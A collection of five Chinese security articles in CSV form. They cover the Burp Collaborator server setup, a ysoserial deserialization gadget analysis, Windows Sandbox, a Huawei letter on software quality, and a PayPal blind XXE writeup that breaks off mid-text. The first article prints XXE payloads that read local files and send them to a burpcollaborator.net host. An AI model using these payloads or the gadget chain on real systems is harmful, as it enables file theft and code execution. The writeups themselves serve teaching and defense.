author,link,published,text,title
s1riu5,,2019-01-10,"Burp suite Pro自从v1.6.15版本开始引入了一种名为Burp Collaborator的模块，该模块的作用简单的说就是集合了DNS log, http_https log和smtp_smtps log的记录器，有点类似国内的Ceye平台。为了解释这个模块，burp引入了In-band attack与 out-band attack（带内与带外攻击）两个概念，两者最主要的区别在于数据的流动方向和参与者的数量。带内攻击(In-band attack)是平时最常见的渗透测试模型：通常在渗透测试过程中，无论是手工还是利用工具都是由攻击端发送含有payload的数据给被攻击端，然后校验被攻击端返回的数据。在这个模型中角色只有两个，流量只有两个信道。带外攻击(out-band attack)则是Burp Collaborator的攻击模型：在带外攻击中由攻击者发送有害流量到被攻击者，但是数据不会直接返回而是转向了第三方服务器，最后返回被攻击者。在带外攻击中，数据走三个信道，有三个角色。当然有时候第三方服务器和攻击者可以在同一个终端上Burp Collaborator是一个c/s结构的服务器。在Project options-&gt;Misc-&gt;Burp Collaborator Server是配置、校验Burp Collaborator服务器的地方。而在Burp-&gt;Burp Collaborator Client是查看服务器信息的地方。0×2 Burp Collaborator Server的搭建Burp Collaborator 是一个C/S结构的应用程序，C自然是burp的客户端，S则可以根据情况而定。0×01 Burp自带的服务器0×02自建服务器环境在https://github.com/0xs1riu5/Writeup/tree/master/0x15Burp%E7%9A%84Collaborator%E4%BB%8B%E7%BB%8D。    Burp Collaborator允许自建服务器，而且自建Collaborator服务器是不需要Pro授权的。自建服务器根据具体的网络分为两种。0×001 内网优点：方便灵活，在无网络的情况下(比如CTF比赛和内网测试)也可以使用。缺点：无DNS log，https log和 smtps log。搭建内网环境已经封装成了docker，前往Docker_Server_Inner目录下：docker-compose builddocker-compose up -d0×002 外网与内网搭建相比，外网就比较麻烦了。所需材料：VPS域名：(从godaddy买的，然后移交到了cloudflare下进行控制)，以my-subdomain-for-burp.luffy.com为例(假域名，需要改成自己的二级域名)LetsEncrypt(免费的ssl加密证书)Burp Suite ProDocker0×0001 配置SSL证书wget https://raw.githubusercontent.com/certbot/certbot/master/certbot-auto -O /usr/local/bin/certbot-autochmod a+x /usr/local/bin/certbot-autocertbot-autocertbot-auto certonly -d my-subdomain-for-burp.luffy.com -d *.my-subdomain-for-burp.luffy.com  --server https://acme-v02.api.letsencrypt.org/directory --manual --agree-tos  --email=you-email@qq.com --manual-public-ip-logging-ok --preferred-challenges dns-01最后生成的证书默认是放在/etc/letsencrypt/目录下的。最后生成的证书默认是放在/etc/letsencrypt/目录下的。然后前往cloudflare添加两个TXT记录： _acme-challenge.my-subdomain-for-burp.luffy.com -&gt; en9Gf... _acme-challenge.my-subdomain-for-burp.luffy.com -&gt; Ffzzws...  0×0002 Burp Collaborator Server的配置将域名和IP改成对应的二级域名和VPS公网IP地址：docker-compose builddocker-compose up -d0×0003 修改A记录和NS记录1.NS记录指向ns1.my-subdomain-for-burp.luffy.com；2.A记录指向公网IP。测试成功。测试成功。但是Burp Collaborator有一个缺点就是数据无法持久化，Burp Suite 不可能保存Collaborator的上下文。关闭client那么所有的数据就丢失了。现在也只能期待以后Burp会添加这方面的功能了。现在为止有一个很好的折衷的方案就是在自建的服务器上开启DEBUG功能(我在docker中已经启用了)，查看log信息，Burp自带的服务器就不可能实现了。我把日志内容导向到了logs目录下的burp.log文件。0×3 漏洞测试0×01 XXE前往Docker_vul_JavaVulnerableLab，这个XXE是回显式的，不过我按照盲注的方式测试：docker-compose builddocker-compose up -d启用之后访问 http://127.0.0.1:8080/vulnerability/Injection/xxe.jsp。忙注的校验漏洞的PAYLOAD：&lt;?xml version=""1.0"" encoding=""UTF-8""?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY hello SYSTEM ""http://cfv17n86l6ri6atl5kbebbxaa1gr4g.burpcollaborator.net""&gt;]&gt;&lt;users&gt;&lt;username&gt;Neo&amp;hello;&lt;/username&gt;&lt;email&gt;neo@matrix&lt;/email&gt;&lt;/users&gt;实现文件读取。新建一个evil.xml文件，放在web目录下：&lt;!ENTITY % file SYSTEM ""file:///etc/issue""&gt;&lt;!ENTITY % ent ""&lt;!ENTITY data SYSTEM 'http://tzwwz7vl66d1gir1nzihuc4hd8jy7n.burpcollaborator.net/%file;'&gt;""&gt;然后修改POST包：&lt;?xml version=""1.0"" encoding=""UTF-8""?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % xxegsd76 SYSTEM ""http://172.168.46.145:6080/evil.xml""&gt; %xxegsd76; %ent; ]&gt;&lt;users&gt;&lt;username&gt;Neo&amp;data;&lt;/username&gt;&lt;email&gt;neo@matrix&lt;/email&gt;&lt;/users&gt;引用链接Introducing Burp Collaborator | BlogBurpsuite之Burp Collaborator模块介绍 – 小小leo – 博客园Running Your Instance of Burp Collaborator Server – Fabio PiresDeploying a private Burp Collaborator serverBurp Collaborator资源整合 – blacksunny – 博客园DNSLog在渗透中的使用 | AdminTony’s Blog从 blind XXE 到读取根目录文件XXE總結 – 掃文資訊XXE总结（小部分自己的）從 blind XXE 到讀取根目錄文件 – 掃文資訊*本文作者：s1riu5，转载请注明来自FreeBuf.COM",Burpsuite Collaborato模块详解
京东安全,,2019-01-08,一、背景及概要随着Java应用的推广和普及，Java安全问题越来越被人们重视，纵观近些年来的Java安全漏洞，反序列化漏洞占了很大的比例。就影响程度来说，反序列化漏洞的总体影响也明显高于其他类别的漏洞。在反序列化漏洞的利用过程中，攻击者会构造一系列的调用链以完成其攻击行为。如何高效的生成符合条件且可以稳定利用的攻击Payload成为了攻击链条中的重要一环，当前已经有很多现成的工具帮助我们完成Payload的生成工作。本文主要以Ysoserial工具为例分析了基于org.apache.commons.collections4类库的Gadget，其通过构造一个特殊的PriorityQueue对象，将其序列化成字节流后，在字节流反序列化的过程中触发代码执行。更多关于Ysoserial的信息，请参考：https://github.com/frohoff/ysoserial。本文主要分为两方面，其一是基于PriorityQueue类的序列化对象的构造，另一方面是PriorityQueue对象在反序列化过程中恶意代码的触发原理。下文将从这两方面展开描述一些细节以及实际测试时的一些问题，整体的流程如图1-1所示。图1-1二、序列化对象的构造首先，被序列化为字节流的对象实际是一个特殊的PriorityQueue对象，本小节主要分析构造该对象的过程，即图1-1的第一步。图2-1为ysoserial.payloads.CommonsCollections4中getObject方法的代码，是用于构造该PriorityQueue对象的代码：图2-1上图中需要注意的有如下两点：1. 通过createTemplatesImpl方法生成templates对象2.通过PriorityQueue类的比较器将构造的一系列transformer串联起来1. createTemplatesImpl方法生成攻击载荷通过createTemplatesImpl方法生成templates对象是非常重要的一部分，因为这是实际承载我们恶意代码的对象，详细说一下，跟进分析createTemplatesImpl方法，其代码具体实现和关键点流程分别如下图2-2和图2-3所示：图2-2图2-3首先生成TemplatesImpl实例，然后通过javassist类库修改StubTransletPayload类字节码，在其中插入执行命令的代码（这里是通过java.lang.Runtime.getRuntime().exec()方法执行命令，也可以插入其他利用代码，如反弹shell等），然后将其父类设置为abstTranslet类，最后将修改后的字节码通过反射写入到TemplatesImpl实例的_bytecodes变量中，这里还同时写入了Foo.class的字节码。除此之外，为了后续恶意代码的触发（如作者注释中所写：required    to make TemplatesImpl happy），还要修改TemplatesImpl实例的_name和_tfactory变量，否则后面会在命令代码执行前抛出异常。StubTransletPayload类代码实现如图2-4所示：图2-4StubTransletPayload类继承自AbstractTranslet类并实现了Serializable接口，通常我们构造一个恶意类可能会直接在static代码块或构造方法中写入我们想要执行的代码，这一步在上面通过javassist类库实现，关于StubTransletPayload类需要继承AbstractTranslet类的原因会在反序列化恶意代码触发时解释。以上即为createTemplatesImpl方法的实现，其本质上是构造了一个特定结构的TemplatesImpl类实例，具体变量的值如图2-5所示：图2-52. 构造并串联transformer回到图2-1本段开始处getObject方法的代码中，在35行和40行分别初始化了ConstantTransformer对象和InstantiateTransformer对象，47行将两个对象构造成Transformer数组作为参数初始化了ChainedTransformer对象chain，而在50行，这个ChainedTransformer对象chain又是我们要序列化的对象PriorityQueue中comparator构造方法的参数，comparator可以理解为在PriorityQueue中决定优先次序的比较器，此处用的是TransformingComparator对象。在44-45行、55-57行利用java的反射机制和引用传递的特性修改chain对象中的变量，ConstantTransformer对象中iConstant变量的值设为com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class，InstantiateTransformer对象中iParamTypes设为javax.xml.transform.Templates.class，iArgs设为此前构造的templates对象。51、52行向队列中插入两个1，这里是为了后面堆化时触发一次堆排序。最终构造了一个用TransformingComparator对象作比较器的PriorityQueue对象，其内存中变量示意图和抽象结构图分别如图2-6和图2-7所示：图2-6图2-7接下来将分析下这个对象序列化后的字节序列如何在反序列化的过程中触发代码执行。3. 反序列化过程中恶意代码的触发原理反序列化开始至触发代码执行的整体流程如图3-1所示：图3-1反序列化过程中首先进入ObjectInputStream类的readObject方法中，然后进入readObject0方法中读取字节流，其中会读取tc标记，然后根据tc标记的类型进入不同的逻辑处理函数中，标记类型可见图3-2：图3-2反序列化的是PriorityQueue对象，这里会进入TC_OBJECT的处理逻辑中，跟进到readOrdinaryObject方法里，其具体代码如图3-3，在1769行读取类描述信息，1780行通过类描述信息，初始化对象obj（即PriorityQueue对象）：图3-3在图3-4中1793行判断是否实现Externalizable接口，通过Externalizable接口可以通过调用对象的readExternal方法实现自定义地完全控制某一对象及其超类的流格式和内容，这里代码进入默认的readSerialData方法中。图3-4在图3-5中1882行判断序列化对象是否有readObject方法，如果有则通过反射调用对象的readObject方法为成员变量赋值，接下来就进入了PriorityQueue对象的readObject方法中。图3-5图3-6为PriorityQueue对象的readObject方法：图3-6图3-7中在defaultReadObject方法中会调用defaultReadFields方法为成员变量赋值：图3-7defaultReadFields方法中1989行会递归调用readObject0方法为对象的成员变量赋值直至完成，逻辑与前面描述相似，此处不再赘述。图3-8defaultReadObject方法执行完成后，代码流程回到PriorityQueue对象的readObject方法（图3-6）中，读取被transient修饰的Object数组queue（此前被赋值为两个int型的数值1），这部分可以和PriorityQueue类的writeObject方法对照着看（图3-9）。图3-9然后代码流程进入图3-6中173行的heapify方法，PriorityQueue本质上是一个最小堆，通过siftDown方法进行次序的调整实现堆化，之前往PriorityQueue对象中插入两个1，可以使队列的SIZE满足for循环的条件从而进入siftDown方法中。                                                                                  图3-10                                                                                      图3-10    继续跟进siftDown方法，次序的调整必然涉及比较，在这儿此前精心构造的比较器就派上用场了，跟进siftDownUsingComparator方法，在图3-11中699行调用了比较器的compare方法。图3-11跟进compare方法，在比较前会先通过transformer的transform方法转换一下对象。而此处的transformer正是我们此前构造的ChainedTransformer对象chain序列化成字节流后又反序列化所得（在递归调用readObject0方法时实现），如图3-12所示。图3-12继续跟进到ChainedTransformer的transform方法中，此时iTransformers中有ConstantTransformer对象和InstantiateTransformer对象，此处代码逻辑是将ConstantTransformer对象中transform方法的返回值作为参数传入InstantiateTransformer对象的transform方法中。图3-13ConstantTransformer对象中transform方法的返回iConstant变量，即com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class:图3-14InstantiateTransformer对象中transform方法反射获取构造方法后生成了TrAXFilter类的实例，通过newInstance方法进入了TrAXFilter类含参构造方法TrAXFilter(Templates templates)中，并将TemplatesImpl实例作为参数传入，如图3-15所示。图3-15TrAXFilter(Templates templates)方法代码如图3-16所示，在64行调用了TemplatesImpl对象的newTransformer方法，newTransformer方法中又调用getTransletInstance方法（图3-17中410行），恶意代码的触发便是在该方法中。图3-16图3-17如图3-18所示，getTransletInstance方法中第376行调用了defineTransletClasses方法后，380行会将_class数组中的某个类实例化：图3-18跟进defineTransletClasses方法发现有如图3-19所示这样一段代码：图3-19其在for循环里遍历_bytecodes数组并通过TransletClassLoader加载字节码，其中会判断_class[i]的父类是否为ABSTRACT_TRANSLET（”com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet”），这解释了为什么_bytecodes中的StubTransletPayload类要继承自AbstractTranslet类，_transletIndex变量初始化时为-1，若此处判断条件为false，_transletIndex的值仍为-1，则程序执行流程会进入后面if    (_transletIndex &lt; 0)的代码块中抛出异常。构造StubTransletPayload类为AbstractTranslet类的子类即可把恶意类的索引值i赋值给_transletIndex。defineTransletClasses方法执行完成后，跳回到getTransletInstance方法中，将_class[_transletIndex]（即StubTransletPayload类）实例化触发我们之前通过javassist类库插入的代码块，实现代码执行（图3-20）。图3-20到这儿基本上整个Gadget的触发流程就走完了。此处通过调用TemplatesImpl对象的newTransformer方法去间接的调用getTransletInstance方法实现代码执行。除此之外，TemplatesImpl类中的getOutputProperties方法又调用了newTransformer，例如fastjson的反序列化中基于TemplatesImpl类的Gadget便是通过getOutputProperties方法去触发代码执行。理论上只要构造特定的TemplatesImpl类对象，然后调用其getTransletInstance方法就可以实现代码执行。为方便理解，我写了一个简单的Demo，通过反射正向构造了一个TemplatesImpl对象并调用其getTransletInstance方法来触发代码执行，代码如下：  4. 关于类的加载中静态代码的执行在demo中是通过插入静态代码块的方式注入恶意代码，我看到后面defineClass对类的加载时一度以为这样的实现类似于fastjson中基于com.sun.org.apache.bcel.internal.util.ClassLoader类实现的POC（具体可参考文章DefineClass在Java反序列化当中的利用），在类加载的过程中实现的static代码块执行，但后来调试时发现static{}中插入的恶意代码仍然是在类实例化（即调用newInstance()）时触发。关于类加载的过程，在《深入理解Java虚拟机》中虚拟机类加载机制一节中有详细的说明，类加载可分为加载、验证、准备、解析和初始化这五个阶段。其中我们关心的static代码块的执行是在初始化阶段，初始化阶段实际是执行类构造器&lt;clinit&gt;()的过程，&lt;clinit&gt;()是在Javac编译过程中生成字节码时被添加到语法树中。&lt;clinit&gt;()方法是编译器自动收集类中的所有类变量的赋值动作和静态语句块中的语句合并产生。——《深入理解Java虚拟机》书中还提到虚拟机规范严格规定了有且只有四种情况必须立即对类进行初始化：•         遇到new、getstatic、putstatic、invokestatic这四条字节码指令时，如果类还没有进行过初始化，则需要先触发其初始化。生成这四条指令最常见的Java代码场景是：使用new关键字实例化对象时、读取或设置一个类的静态字段（static）时（被static修饰又被final修饰的，已在编译期把结果放入常量池的静态字段除外）、以及调用一个类的静态方法时。•         使用Java.lang.refect包的方法对类进行反射调用时，如果类还没有进行过初始化，则需要先触发其初始化。•         当初始化一个类的时候，如果发现其父类还没有进行初始化，则需要先触发其父类的初始化。•         当虚拟机启动时，用户需要指定一个要执行的主类，虚拟机会先执行该主类。前面在通过TransletClassLoader中的defineClass方法加载类时仅将字节码装载到了JVM中，没有执行类的初始化，而fastjson的Poc中通过Class.forName()加载类时，Class.forName()方法除了将对应的类装载到JVM中，还会执行类构造器&lt;clinit&gt;()对类进行初始化，从而执行static代码块。Class.forName()代码实现（JDK1.7）见图4-1：图4-1forName0()方法用native关键字修饰，说明这个方法是原生函数，非Java语言实现。可从forName()方法的注释中看到第二个参数决定类是否会被初始化，在forName(String className)中默认为true。以上基本解释了我在关于注入的静态代码触发位置的疑惑。5. 总结整个Gadget的调用栈见图5-1：图5-1反序列化时首先从ObjectInputStream类的readObject方法中进入到PriorityQueue类的readObject方法里，其readObject方法中会进行堆化，堆化时队列中元素大于等于2时会进行堆排序，这时会调用自定义的比较器（TransformingComparator），TransformingComparator在比较次序时会将对象进行转换。转换时使用的transformer是基于ConstantTransformer对象和InstantiateTransformer对象构造的ChainedTransformer对象，ChainedTransformer对象在其转换方法（transform()）中会依次调用ConstantTransformer对象和InstantiateTransformer对象的transform方法，并将前一个对象transform方法的返回值作为参数传入后一个对象的transform方法中，InstantiateTransformer对象中的transform方法会基于参数（这里即ConstantTransformer.transform()的返回值com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter）新建实例，则进入了TrAXFilter类的构造方法中，这里调用了TransformerImpl实例的newTransformer方法，又调用了getTransletInstance方法，加载_bytecodes中修改后的StubTransletPayload类字节码并生成实例，从而触发代码执行。三、参考https://github.com/frohoff/ysoserial https://stackoverflow.com/questions/39504847/why-does-class-not-invoke-the-static-block-in-a-class        https://www.freebuf.com/articles/others-articles/167932.html*本文作者：京东安全，转载请注明来自 FreeBuf.COM,Java反序列化：基于CommonsCollections4的Gadget分析
Alpha_h4ck,,2019-01-05,写在前面的话有多少次，当你下载了一个可执行文件之后，你却不敢直接运行它？你是否需要一个干净的Windows安装环境，但是又懒得搭建一台虚拟机呢？为了应对这种场景，微软开发了Windows Sandbox：一款隔离的、临时性的桌面环境，用户可以在这个环境下运行不受信任的软件，而无需担心主机系统受到影响，因为任何安装在Windows Sandbox中的软件就只会在沙盒环境中运行。Windows Sandbox关闭之后，所有的软件和文件都会被永久删除。Windows Sandbox的特点：Windows系统的默认组件、纯净版、一次性使用、安全和高效。依赖条件1、 Windows 10专业版或企业版（InsiderBuild 18305及以上版本）2、 AMD 64位架构3、 BIOS启用虚拟化功能4、 至少4GB RAM（推荐8GB）5、 至少1GB磁盘空间（推荐SSD）6、 至少双核CPU（推荐四核超线程CPU）快速开始1、 安装Windows 10专业版或企业版，InsiderBuild 18305及以上版本。2、 启用虚拟化：a)     如果你使用的是物理设备，确保BIOS中开启了虚拟化功能；b)    如果你使用的是虚拟设备，运行下列PowerShell命令启用嵌套虚拟化功能：Set-VMProcessor -VMName &lt;VMName&gt;-ExposeVirtualizationExtensions $true3、 在控制面板中进入“启用或关闭Windows功能”，选择Windows Sandbox，点击“确定”，重启电脑后即可完成Windows Sandbox的安装：4、 点击“开始”菜单，找到Windows Sandbox，双击运行。5、 从本地主机中复制一个可执行文件。6、 将可执行文件粘贴到Windows Sandbox的运行窗口中。7、 在Windows Sandbox中运行这个可执行文件，或完成程序安装。8、 正常使用该程序。9、 实验或分析完成后，关闭Windows Sandbox应用程序即可。沙盒环境下的所有内容都将被永久删除。注：Windows Sandbox遵循主机的诊断数据设置，所有其他的隐私设置均为默认值。Windows Sandbox内部机制Windows Sandbox基于WindowsContainers（Windows容器）技术实现，WindowsContainers主要适用于云环境，微软基于该技术实现了Windows Sandbox，并将其整合进了Windows 10中。动态生成镜像Windows Sandbox实际上是一款轻量级虚拟机，因此它需要操作系统镜像才可启动。Windows Sandbox其中一个关键性升级，就是它可以使用本地主机的Windows10系统副本，因此用户无需再下载一个新的VHD镜像了。在每次进行安全分析之前，我们都需要一个干净的分析环境，这里我们提出了“动态镜像”的概念：即保存一份纯净版的操作系统镜像，基于这个操作系统镜像做多个镜像拷贝，镜像拷贝文件可修改，但源镜像不可修改。其中的大部分文件均为链接，因此整个操作系统的大小非常小，约为100MB。如果主机没有安装Windows Sandbox，那么系统会将动态镜像以压缩包的形式存储，大小仅为25MB。但是安装之后，动态镜像数据包将会解压并占100MB磁盘空间。智能内存管理内存管理是另一个整合进Windows内核的部分，Windows的管理程序允许单一物理设备分隔成多个共享相同物理硬件的虚拟机。这种方式虽然对传统的服务器负载效果比较好，但它不太适用于那些资源有限的设备，而Windows Sandbox的优势就在于主机可以根据需要来从沙盒系统中回收内存。除此之外，由于Windows Sandbox的运行基本上跟主机操作系统相同，因此Windows Sandbox还可以通过“直接映射”技术来使用跟主机相同的物理内存页面。集成内核调度器对于普通虚拟机，Windows的管理程序主要控制的是运行在虚拟机中的虚拟进程。但Windows Sandbox使用的是一种名叫“集成调度器”的新技术，这种技术允许主机来决定沙箱何时运行。Windows Sandbox采用了独特的调度策略，允许以跟进程调度线程相同的方式来调度沙箱的虚拟处理器。值得一提的是，大家可以把Windows Sandbox当做一个应用程序，但是它却能提供跟虚拟机一样的安全保护。快照和克隆Windows Sandbox的每一次启动其实并不需要花费完整的系统启动资源，因为这里使用了另外两种技术：即“快照”和“克隆”。快照允许我们挂起沙箱环境，并将内存、CPU和设备状态存储在磁盘中。当我们需要一个新的Windows Sandbox实例时，可以直接从磁盘恢复沙箱环境并将其放入内存中，这样显著降低了Windows Sandbox的启动时间。结束语希望大家能够充分利用这个Windows 10自带的沙盒环境，如果使用过程中遇到了任何问题，均可直接向微软提供报告或建议。* 参考来源：microsoft，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM,Windows Sandbox：轻量级桌面环境专为安全运行应用程序而设计
Freddy,,2019-01-03,"日前，任正非签发华为2019年一号文件，任正非在文中指出，华为已经明确将网络安全和隐私保护作为工作的最高纲领。任正非在文件中称，华为将改变行为习惯，追求精品。我们要开放透明、积极和勇于揭示问题并主动推动改进。同时还将上线新的流程、组织和考核机制。以下为任正非签发文件的全文内容：全面提升软件工程能力与实践，打造可信的高质量产品——致全体员工的一封信我今天写信，是要和大家沟通公司如何全面提升软件工程能力和实践。二十年前的IPD变革，重构了我们的研发模式，实现了从依赖个人、偶然性推出成功产品，到制度化、持续地推出高质量产品的转变。至今为止，我们的产品和解决方案已经在170多个国家安全稳定运行，并因此积累和赢得了全球数万客户的信任。今天，我们又处在一个新的起点，全面云化、智能化、软件定义一切等发展趋势，对ICT基础设施产品的可信提出了前所未有的要求。可信将成为客户愿买、敢买和政府接受、信任华为的基本条件。可信不仅仅是产品外在表现的高质量结果，更是产品内在实现的高质量过程，是结果和过程的双重可验证的高质量。而只有全面提升软件工程能力和实践，才有可能打造出可信的高质量产品。公司已经明确，把网络安全和隐私保护作为公司的最高纲领。我们要在每一个ICT基础设施产品和解决方案中，都融入信任、构建高质量，关键内容包括：安全性（Security）：产品有良好的抗攻击能力，保护业务和数据的机密性、完整性和可用性。韧性（Resilience）：系统受攻击时保持有定义的运行状态，包括降级，以及遭遇攻击时快速恢复的能力。隐私性（Privacy）：遵从隐私保护既是法律法规的要求，也是价值观的体现。用户应该能够适当地控制他们的数据的使用方式。信息的使用政策应该是对用户透明的。用户应该根据自己的需要来控制何时接收以及是否接收信息。用户的隐私数据要有完善的保护能力和机制。可靠性和可用性（Reliability&amp; Availability）：产品能在生命周期内长期保障业务无故障运行，具备快速恢复和自我管理的能力，提供可预期的、一致的服务。全面提升软件工程能力和实践，关乎公司未来的生存和发展，与我们每一个人都息息相关。在此，我希望全体员工、特别是软件工程师们主动参与进来，从自己做起，踏踏实实，共同打造可信的高质量产品。我们要转变观念，追求打造可信的高质量产品，不仅仅是功能、特性的高质量，也包括产品开发到交付过程的高质量。我们知道，功能、特性对产品至关重要，我们更知道，进度对满足客户需求也至关重要。今天，我们要把可信作为第一优先级，放在功能、特性和进度之上。除非客户信任我们的产品，否则这些优秀的特性都没有机会发挥价值。我们各级管理者和全体员工都不得以进度、功能、特性等为理由来降低可信的要求，确保可信的要求在执行过程中不变形。我们要从最基础的编码质量做起，视高质量代码为尊严和个人声誉。代码就像是高楼大厦的一砖一瓦，没有高质量的代码，可信的产品就是空中楼阁。我们要优化并遵循公司各种编程规范，遵从架构与设计原则，熟练使用各种编程库和API，编写出简洁、规范、可读性强、健壮安全的代码。我们要深刻理解架构的核心要素，基于可信导向来进行架构与设计。在确保可信的前提下，要在性能、功能、扩展性等方面做好权衡；慎重地定义我们的模块与接口，真正做到高内聚与低耦合；我们要遵循权限和攻击面最小化等安全设计原则，科学设计模块之间的隔离与接口，提升安全性；低阶架构与设计要遵循高阶的架构与设计原则，在充分理解原有架构与设计的情况下，持续优化；我们要熟悉各种设计模式，重用公共成熟组件和服务，避免重复劳动。我们要重构腐化的架构及不符合软件工程规范和质量要求的历史代码。我们知道，再好的架构，其生命力也是有限的。随着时间的推移、环境的变化以及新技术、新功能特性的引入，架构也会腐化。面对腐化了的架构，要毫不犹豫地去重构它。同时主动以可信设计原则为导向，去重构不符合软件工程规范和质量要求的历史代码，提升软件架构的生命力。我们要深入钻研软件技术，尤其是安全技术。软件技术是我们打造产品的基本工具，技术是否先进，技术选择是否合理，将决定我们软件的高度；我们要深入学习架构与设计、编码、测试、安全、可用性、性能、维护性、体验等技术，并科学运用这些技术。我们要遵守过程的一致性。遵守适用的法律法规、遵循业界共识的标准、规范，确保规范到实现的一致性、代码到二进制的一致性。架构要符合架构原则，设计要遵循设计模式，代码要符合编程规范，最终做到需求与实现一致，达成各项对客户的承诺。我们只有脚踏实地做好每一步，才能真正打造出可信的高质量产品。为此，我们要改变行为习惯，追求精品。我们要开放透明、积极和勇于揭示问题并主动推动改进。软件开发是一种创造性和艺术性的工作，需要充分发挥我们的聪明才智和潜力。我们要改变只重视功能结果、不重视代码质量的行为习惯，要严格遵守软件工程规范；改变被动的修修补补；改变碎片化知识获取，主动去学习提升并贡献经验、代码，形成共享知识库。我们需要改变的行为和习惯还有很多，对绝大多数人来讲都将是一个痛苦的转变过程，会脱一层皮，但我相信大家能够迎接这种挑战。更为重要的是，我们将通过变革形成一套适应上述变化的流程、组织与考核机制。我们要完善并增强透明、可回溯和可审计的全流程管理机制，以可信的视角，从初始设计、完整构建到产品生命周期管理，全面提升软件工程能力和实践。我们将全面强化以Committer角色为核心的代码审核和提交机制，代码经过更加严格和系统的审核才能合入版本。为此我们将建立一支更高水平的Committer角色群体，负责软件架构的看护、代码的审核和提交，整体保障合入代码的高质量。我们要变革考核机制，要让架构设计好、代码写得好的人脱颖而出，对编程能力不满足要求的人给予帮助和培训。但任何人如果编写的代码长时间不能合入版本，将会被团队抛弃。过去一百年来，世界上许多成功的公司都因不能适应变化而倒下。要适应外部变化，唯有自我进化，我们必须保持开放和持续变革。董事会已决定，全面提升软件工程能力与实践将以变革的方式来开展，由轮值董事长徐直军总负责,公司初始投入20亿美元,计划用5年时间，在ICT基础设施领域实现为客户打造可信的高质量产品的目标。希望您支持并积极投入到这一伟大的变革。唯有如此，我们才能实现未来的愿景和使命：把数字世界带入每个人、每个家庭、每个组织，构建万物互联的智能世界。本文转载自：IT之家，Freddy整理，转载文章请注明来源。",华为一号文件：网络安全和隐私保护是最高纲领
生如夏花,,2019-01-01,"技术细节和描述：应用程序如果存在解析XML的功能可能会存在XML外部实体注入漏洞，当输入包含对外部实体引用的XML而由不安全配置的XML解析器处理时，会造成漏洞。它会导致机密数据泄露，拒绝服务，服务器端请求伪造风险，以及进行内网端口扫描等其他系统影响。PayPal官方网络应用程序(PayPal Inc – PayPal Multi-Order Shipping Application [Core])则存在此安全漏洞。背景：PayPal Multi-Order Shipping是一种工具，允许一次从PayPal账户打印多达50个国内美国邮政服务运输标签。包括多项服务如下：* 从eBay和/或PayPal导入交易* 手动创建一个或多个ad-hoc标签* 获取订单准备打印标签* 修改订单的送货详细信息* 为订单添加保险和签名确认* 将多个订单合并为一个货件* 还原合并订单* 在“发运订单”选项卡中添加或删除列* 应用程序设置和省时工具* 打印标签和支持文档Carrier Pickup™和装运后管理识别阶段：在通过拦截环境中的请求来测试应用程序的功能时，以下请求引起了我的注意，发现该应用程序是基于XML的，与服务器交换的请求是XML格式的结构化数据。在第一次测试中，我们需要确认实体是以最基本的形式解析的。所以我们用内联实体替换VALUE来分析服务器行为：    返回的响应是无效的输入错误，因此服务器有一个反射点来显示注入的payload，因为XML请求是用户提供的，我测试了基本的XML注入，通过尝试使用注入实体提取文件来检查应用程序的XML处理方法，将读取远程文件回显在客户端。此攻击的思路是声明外部通用实体并引用网络资源或本地的内部文件：    我们注意到应用程序只检查的位置：字符串，数字，CDATA值。不使用从文档内的元数据或实体引用的值。因此，在提交请求后无法获得直接回显。XXE带外通道的利用XXE处理概述：默认情况下，XML解析器通常支持外部引用，外部实体可以引用解析器文件系统上的文件。外部实体通常也可以通过HTTP协议处理程序引用网络资源。向其他系统发送请求的能力可以使易受攻击的服务器用作攻击代理。通过提交合适的有效payload，攻击者可以使应用程序服务器来攻击可以与之交互的其他系统。这可能包括公共第三方系统，同一组织内的内部系统，或应用程序服务器本身的本地环回适配器上可用的服务。根据网络架构，这可能会暴露给外部攻击者无法访问的高度脆弱的内部服务。我们注意到应用程序只检查的位置：字符串，数字，CDATA值。不使用从文档内的元数据或实体引用的值。因此，在提交请求后无法获得直接回显。攻击方法：1.绕过XXE注入点无法直接回显经过多次测试后，我确认没有直接回显通道，但可以强制服务器在响应中显示结果。所以我使用了一种技术，我们使用“DOCTYPE”中的外部实体注入XML payload而不是一般实体，带有SYSTEM关键字的DOCTYPE声明会导致XML解析器从URI读取数据并允许它继续进入文档：应用程序服务器响应了内部服务器错误消息，在我发送请求后，我的服务器从PayPal的内部服务器收到连接： 现在我们确认了外部实体已激活，这意味着允许从被攻击的服务器连接到其他远程系统，并且可以使用外部DTD通过Web请求读取本地文件。这种技术将允许我们从我们控制的主机请求任何网络资源，而资源可以托管在HTTP服务器，FTP服务器等上。1.通过带外XXE参数实体搜索数据：为了克服解析限制，例如（有限使用外部实体，在主XML文档中引用通用/参数实体），我想到：* 在DTD定义中使用参数实体。* 使服务器与我的外部域交互并解析XXE payload，而不是直接在XML文档中执行攻击。可以通过仅引用托管的DTD资源来执行此攻击。只要服务器处理XML请求，该请求甚至不必包含任何XML主体。A.通过协议处理程序进行XXE数据搜索：参数实体帮助我们使用上述技术通过外部实体访问来从被攻击的服务器中向外部服务器传输文件资源内容。虽然解析器存在漏洞，但不支持直接输出回显。现在的目标是访问服务器的内部本地文件/资源（文件泄露），利用支持各种URL方案/协议的许多平台/解析器中使用的协议处理程序（封装）：从目标应用程序执行数据提取并连接到我的服务器以获取DTD，然后发送文件内容。假设有严格的防火墙限制，我测试了不同的协议处理程序和公共端口（21,23,80,443,8080，…）然后我意识到目标服务器阻止到某些TCP端口的传出连接，例如：21（FTP），8080,8000,1337,2222 ……等。但是，我们仍然可以选择通过HTTP / HTTPS请求将任意文件提取回受控域。在提取“/etc/passwd”文件之后，经过几次尝试，几秒钟就会打开连接并收到文件内容：注意到URL中发送的数据长度几乎肯定是有限的，这取决于某些特定的实现，这就是为什么使用这种方法只能读取一行/etc/passwd的内容。URL通常必须由正确形成的Unicode数据组成，并且还必须符合特定XML库对URL中允许的字符的限制。有时解析器不会检查创建的URI的长度，并且许多解析器会自动转换换行符（Xerces用空格替换它们，而System.XML进程用URL编码替换）。B.Bypass URI长度和服务器防火墙限制：考虑以下：* 控制将在我们受控服务器侧检查的数据块长度。* 从易受攻击的服务器建立到远程系统的连接，可以使用外部DTD来泄露数据。* 使用PayPal远程服务器控制TCP通信协议。* 